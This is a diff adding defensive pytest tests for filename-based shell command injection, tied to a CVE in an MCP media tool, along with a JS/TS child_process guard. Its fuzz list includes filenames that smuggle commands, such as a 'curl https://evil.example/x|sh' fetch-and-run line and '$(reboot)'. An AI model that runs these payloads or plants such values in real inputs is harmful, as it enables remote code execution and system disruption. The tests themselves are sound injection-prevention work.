@@ -36,6 +36,27 @@ The hedge, turned into a permanent CI gate:
   stay a single argv element / a URL-quoted path segment / a JSON field —
   never a shell string — and must never reach a shell at all.
 
+Dev-watch 302 (CVE-2026-117568, mcp-ffmpeg — OS command injection via
+filenames, where a media tool interpolated a filename argument into a
+``child_process.exec`` shell string) extends the same machinery:
+
+* the per-tool fuzz corpus gains plausible *filenames / paths* — media
+  extensions, spaces, ordinary words — with ``$(...)``, backticks and a
+  closing double-quote embedded in them, not raw probes;
+* the CI guard covers the JavaScript spelling too: ``child_process.exec``
+  / ``execSync`` (direct, aliased or destructured) and a ``shell:``
+  option in any JS/TS file that imports ``child_process`` are failures,
+  alongside the Python ``shell=True`` / ``create_subprocess_shell``
+  spellings, which are additionally asserted explicitly against the MCP
+  server modules by name;
+* a negative test passes a filename containing ``$(touch <sentinel>)``
+  (and the backtick spelling) through the nearest real tool surfaces —
+  this codebase has no media/ffmpeg tool and no MCP tool taking a
+  filename argument, so the filename goes to the MCP server's ``get_task``
+  path argument / ``list_tasks`` filter and, for a *real* subprocess, to
+  the MetaMask adapter's external-binary runner pointed at ``echo`` —
+  and asserts the sentinel file is NOT created.
+
 The static guard is AST-based: it only inspects real ``Call`` nodes, so a
 docstring, comment or string literal that merely *mentions* ``shell=True``
 (for example the banned-construct list in ``agency_kernel_tools.py``) does
@@ -45,6 +66,8 @@ not false-positive.
 from __future__ import annotations
 
 import ast
+import re
+import shutil
 import subprocess
 from pathlib import Path
 from types import SimpleNamespace
@@ -1449,3 +1472,365 @@ class TestMetamaskAdapterFuzz:
         assert captured["kwargs"].get("shell") is not True
         assert poison in cmd  # verbatim, as its own element
         assert cmd.count(poison) == 1
+
+
+# ---------------------------------------------------------------------------
+# 3. Dev-watch 302 — filename-embedded fuzz corpus (CVE-2026-117568)
+# ---------------------------------------------------------------------------
+
+# Plausible filenames / paths an agent might hand a media or file tool —
+# ordinary words, spaces and media extensions — with shell metacharacters
+# EMBEDDED in them: $(...) command substitution, backticks, a closing
+# double-quote that would break out of a "..."-quoted shell string, and
+# the ; | & separators in filename-plausible positions. Deliberately NOT
+# bare probes like ";" or "$(id)" on their own.
+POISONED_FILENAMES = [
+    "quarterly report $(touch /tmp/pwned).mp4",
+    "clip`id`.mov",
+    'my "video".mp4',
+    "vacation $(id).mkv",
+    "screen recording `whoami`.webm",
+    "interview; final cut.mp4",
+    "demo|master.mov",
+    "podcast ep 12 $(touch /tmp/pwned).mp3",
+    "premiere `curl https://evil.example/x|sh`.mp4",
+    "render $(reboot) final.mp4",
+    'trailer".mp4',
+    "/media/uploads/quarterly report $(touch /tmp/pwned).mp4",
+    "team & family.mp4",
+    "scan `id` 001.tiff",
+]
+
+_MEDIA_EXTENSIONS = (".mp4", ".mov", ".mkv", ".webm", ".mp3", ".tiff")
+
+
+class TestFilenameCorpusShape:
+    """The 302 corpus is filenames first, metacharacters embedded."""
+
+    def test_every_entry_is_a_plausible_filename(self):
+        for name in POISONED_FILENAMES:
+            assert name.endswith(_MEDIA_EXTENSIONS), name
+            # Ordinary filename material (a word-bearing stem of at
+            # least 3 chars) precedes or surrounds the payload — not a
+            # bare metacharacter probe like "$()" on its own.
+            stem = name.rsplit(".", 1)[0]
+            assert len(re.findall(r"[A-Za-z]", stem)) >= 3, name
+
+    def test_corpus_covers_the_required_metachar_families(self):
+        joined = "\n".join(POISONED_FILENAMES)
+        assert "$(" in joined  # command substitution
+        assert "`" in joined  # backtick substitution
+        assert '"' in joined  # closing double-quote breakout
+
+
+class TestFilenameFuzzMcpServer:
+    """Poisoned filenames through the MCP server's tool-arg handling.
+
+    No MCP tool in this codebase takes a filename argument (there is no
+    media/ffmpeg tool), so the filename is fed to the nearest real
+    filename/path-shaped surfaces: ``get_task``'s task_id (interpolated
+    into a request *path*) and ``list_tasks``' skill filter.
+    """
+
+    def _call(self, mcp, name, arguments):
+        return mcp.handle_message(
+            {
+                "jsonrpc": "2.0",
+                "id": 1,
+                "method": "tools/call",
+                "params": {"name": name, "arguments": arguments},
+            }
+        )
+
+    @pytest.mark.parametrize("filename", POISONED_FILENAMES)
+    def test_filename_as_task_id_is_url_quoted_not_shell(
+        self, monkeypatch, no_shell_ever, filename
+    ):
+        from sincor2 import mcp_server as mcp
+
+        seen: dict[str, str] = {}
+
+        def fake_get(path, params=None):
+            seen["path"] = path
+            return {"ok": False, "data": None}
+
+        monkeypatch.setattr(mcp, "_get", fake_get)
+        resp = self._call(mcp, "get_task", {"task_id": filename})
+        assert resp is not None and "result" in resp
+        for ch in (";", "`", "$", "|", " ", '"', "\n"):
+            assert ch not in seen["path"], (ch, seen["path"])
+        assert no_shell_ever == []
+
+    @pytest.mark.parametrize("filename", POISONED_FILENAMES)
+    def test_filename_as_skill_filter_never_reaches_shell(
+        self, monkeypatch, no_shell_ever, filename
+    ):
+        from sincor2 import mcp_server as mcp
+
+        monkeypatch.setattr(
+            mcp, "_get", lambda path, params=None: {"ok": True, "data": {"auctions": []}}
+        )
+        resp = self._call(mcp, "list_tasks", {"skill": filename})
+        assert resp is not None and "result" in resp
+        assert no_shell_ever == []
+
+    @pytest.mark.parametrize("filename", POISONED_FILENAMES)
+    def test_filename_as_agent_name_stays_a_json_field(
+        self, monkeypatch, no_shell_ever, filename
+    ):
+        from sincor2 import mcp_server as mcp
+
+        resp = self._call(
+            mcp, "register_agent", {"agent_id": "agent-302", "name": filename}
+        )
+        assert resp is not None and "result" in resp
+        assert no_shell_ever == []
+
+
+class TestFilenameSentinelNegative:
+    """Negative test (302 deliverable c): a filename containing $(...)
+    passed to a tool surface must NOT execute — the sentinel file the
+    payload tries to ``touch`` is never created."""
+
+    @pytest.mark.parametrize(
+        "template",
+        [
+            "quarterly report $(touch {sentinel}).mp4",
+            "clip`touch {sentinel}`.mov",
+        ],
+    )
+    def test_filename_payload_creates_no_sentinel_via_mcp_tools(
+        self, monkeypatch, no_shell_ever, tmp_path, template
+    ):
+        from sincor2 import mcp_server as mcp
+
+        sentinel = tmp_path / "pwned"
+        filename = template.format(sentinel=sentinel)
+
+        monkeypatch.setattr(
+            mcp, "_get", lambda path, params=None: {"ok": False, "data": None}
+        )
+        for tool, args in (
+            ("get_task", {"task_id": filename}),
+            ("list_tasks", {"skill": filename}),
+            ("register_agent", {"agent_id": "agent-302", "name": filename}),
+        ):
+            resp = mcp.handle_message(
+                {
+                    "jsonrpc": "2.0",
+                    "id": 1,
+                    "method": "tools/call",
+                    "params": {"name": tool, "arguments": args},
+                }
+            )
+            assert resp is not None and "result" in resp
+        assert not sentinel.exists(), (
+            f"shell executed the filename payload: {filename!r}"
+        )
+        assert no_shell_ever == []
+
+    @pytest.mark.parametrize(
+        "template",
+        [
+            "quarterly report $(touch {sentinel}).mp4",
+            "clip`touch {sentinel}`.mov",
+        ],
+    )
+    def test_filename_payload_creates_no_sentinel_via_real_subprocess(
+        self, monkeypatch, no_shell_ever, tmp_path, template
+    ):
+        """Strongest form: a REAL subprocess runs. The MetaMask adapter
+        is the codebase's external-binary runner (the ffmpeg-shaped
+        surface: binary + user-supplied arguments); pointed at ``echo``
+        with the poisoned filename as an argument, the value must arrive
+        as one literal argv element and the payload must not execute.
+        ``no_shell_ever`` still guards subprocess.run: argv list only,
+        shell never True — the real echo binary then executes."""
+        from sincor2.adapters import metamask_agent_wallet as mmw
+
+        echo = shutil.which("echo")
+        assert echo, "echo binary required for the real-subprocess test"
+        sentinel = tmp_path / "pwned"
+        filename = template.format(sentinel=sentinel)
+
+        monkeypatch.setattr(mmw, "kill_switch_tripped", lambda: False)
+        wallet = mmw.MetaMaskAgentWallet(mm_bin=echo)
+        out = wallet._run("ffmpeg", "-i", filename, wait=False)
+
+        # echo printed its argv verbatim: the filename survived as data,
+        # unexpanded, in a single element's worth of output text.
+        raw = (out.get("data") or {}).get("raw", "")
+        assert filename in raw, out
+        assert not sentinel.exists(), (
+            f"shell executed the filename payload: {filename!r}"
+        )
+        assert no_shell_ever == []
+
+
+# ---------------------------------------------------------------------------
+# 4. Dev-watch 302 — child_process guard for JS/TS + explicit MCP coverage
+# ---------------------------------------------------------------------------
+
+# The MCP surface modules, named explicitly so the Python spellings
+# (shell=True / create_subprocess_shell) are asserted against them even
+# if the tree scan above is ever narrowed.
+_MCP_SERVER_MODULES = ["mcp_server.py", "swarm_command_mcp.py"]
+
+
+class TestMcpModulesGuardExplicit:
+    @pytest.mark.parametrize("rel_path", _MCP_SERVER_MODULES)
+    def test_mcp_server_module_has_no_shell_execution(self, rel_path):
+        path = SRC_ROOT / rel_path
+        assert path.is_file(), f"missing MCP server module: {rel_path}"
+        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
+        assert violations_from_ast(tree, rel_path) == []
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            # The three spellings the 302 hedge names, as MCP-server code.
+            "import subprocess\nsubprocess.run(cmd, shell=True)\n",
+            "import asyncio\nasyncio.create_subprocess_shell(cmd)\n",
+            "from asyncio import create_subprocess_shell\n"
+            "create_subprocess_shell(cmd)\n",
+        ],
+    )
+    def test_mcp_spellings_are_failures(self, source):
+        assert violations_from_source(source), f"guard missed: {source!r}"
+
+
+_JS_SUFFIXES = {".js", ".mjs", ".cjs", ".ts", ".mts", ".cts", ".tsx"}
+_JS_SKIP_DIRS = {"node_modules", ".git"}
+
+# child_process spellings that build a shell string (the mcp-ffmpeg CVE
+# class): exec / execSync run their argument through a shell by design.
+_JS_BANNED_MEMBERS = ("exec", "execSync")
+
+
+def _js_child_process_aliases(source: str) -> tuple[set[str], set[str]]:
+    """(module aliases, destructured banned names) for child_process
+    imports in a JS/TS source string."""
+    aliases = {"child_process"}
+    for pattern in (
+        r"(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*require\(\s*['\"]child_process['\"]\s*\)",
+        r"import\s+([A-Za-z_$][\w$]*)\s+from\s+['\"]child_process['\"]",
+        r"import\s+\*\s+as\s+([A-Za-z_$][\w$]*)\s+from\s+['\"]child_process['\"]",
+    ):
+        aliases.update(re.findall(pattern, source))
+    names: set[str] = set()
+    for pattern in (
+        r"(?:const|let|var)\s*\{([^}]*)\}\s*=\s*require\(\s*['\"]child_process['\"]\s*\)",
+        r"import\s*\{([^}]*)\}\s*from\s+['\"]child_process['\"]",
+    ):
+        for group in re.findall(pattern, source):
+            for part in group.split(","):
+                name = part.strip().split(":")[0].strip().split(" as ")[0].strip()
+                if name in _JS_BANNED_MEMBERS:
+                    names.add(name)
+    return aliases, names
+
+
+def js_shell_violations_from_source(
+    source: str, filename: str = "<synthetic>"
+) -> list[str]:
+    """Flag child_process.exec / execSync (direct, aliased or
+    destructured) and any ``shell:`` option that is not ``false`` in a
+    source that imports child_process — the JS analogues of shell=True
+    and create_subprocess_shell. Conservative: a bare ``exec(`` is only
+    flagged when it was actually imported from child_process, so
+    RegExp.prototype.exec and friends stay clean."""
+    found: list[str] = []
+    aliases, destructured = _js_child_process_aliases(source)
+    for lineno, line in enumerate(source.splitlines(), start=1):
+        for alias in aliases:
+            for member in _JS_BANNED_MEMBERS:
+                if re.search(
+                    rf"\b{re.escape(alias)}\s*\.\s*{member}\s*\(", line
+                ):
+                    found.append(
+                        f"{filename}:{lineno}: {alias}.{member}() executes "
+                        "through a shell (child_process argv forms only: "
+                        "execFile / spawn with an args array)"
+                    )
+        for name in destructured:
+            if re.search(rf"(?<![\w$.]){name}\s*\(", line) and (
+                "require(" not in line and "import" not in line
+            ):
+                found.append(
+                    f"{filename}:{lineno}: destructured child_process "
+                    f"{name}() executes through a shell"
+                )
+        if aliases - {"child_process"} or destructured or "child_process" in source:
+            shell_opt = re.search(r"\bshell\s*:\s*(.+?)[,}\)]", line)
+            if shell_opt and shell_opt.group(1).strip() != "false":
+                found.append(
+                    f"{filename}:{lineno}: shell: option in a "
+                    "child_process call is not false"
+                )
+    return found
+
+
+def _js_files() -> list[Path]:
+    out = []
+    for path in sorted(REPO_ROOT.rglob("*")):
+        if path.suffix not in _JS_SUFFIXES or not path.is_file():
+            continue
+        if _JS_SKIP_DIRS.intersection(path.parts):
+            continue
+        out.append(path)
+    return out
+
+
+class TestChildProcessGuard:
+    def test_repo_js_ts_has_no_child_process_shell_execution(self):
+        all_violations: list[str] = []
+        for path in _js_files():
+            all_violations.extend(
+                js_shell_violations_from_source(
+                    path.read_text(encoding="utf-8", errors="replace"),
+                    str(path.relative_to(REPO_ROOT)),
+                )
+            )
+        assert all_violations == [], (
+            "child_process shell-execution violations "
+            "(dev-watch 302: argv forms only):\n" + "\n".join(all_violations)
+        )
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "const { exec } = require('child_process');\n"
+            "exec(`ffmpeg -i \"${name}\" out.mp4`);\n",
+            "const cp = require('child_process');\ncp.exec('ls ' + name);\n",
+            "import { execSync } from 'child_process';\nexecSync(cmd);\n",
+            "import child_process from 'child_process';\n"
+            "child_process.execSync(cmd);\n",
+            "const { spawn } = require('child_process');\n"
+            "spawn('ffmpeg', args, { shell: true });\n",
+            "const cp = require('child_process');\n"
+            "cp.spawn(cmd, { shell: '/bin/sh' });\n",
+        ],
+    )
+    def test_guard_detects_child_process_shell_patterns(self, source):
+        assert js_shell_violations_from_source(source), (
+            f"guard missed: {source!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            # argv forms: execFile / spawn with an args array, no shell.
+            "const { execFile } = require('child_process');\n"
+            "execFile('ffmpeg', ['-i', name]);\n",
+            "const { spawn } = require('child_process');\n"
+            "spawn('ffmpeg', ['-i', name], { shell: false });\n",
+            # RegExp exec is not child_process.
+            "const m = /a/.exec(input);\n",
+            "const re = new RegExp('x');\nconst out = re.exec(s);\n",
+            # No child_process import at all: shell: is someone else's
+            # option object.
+            "const opts = { shell: true };\n",
+        ],
+    )
+    def test_guard_ignores_argv_forms_and_unrelated_exec(self, source):
+        assert js_shell_violations_from_source(source) == []
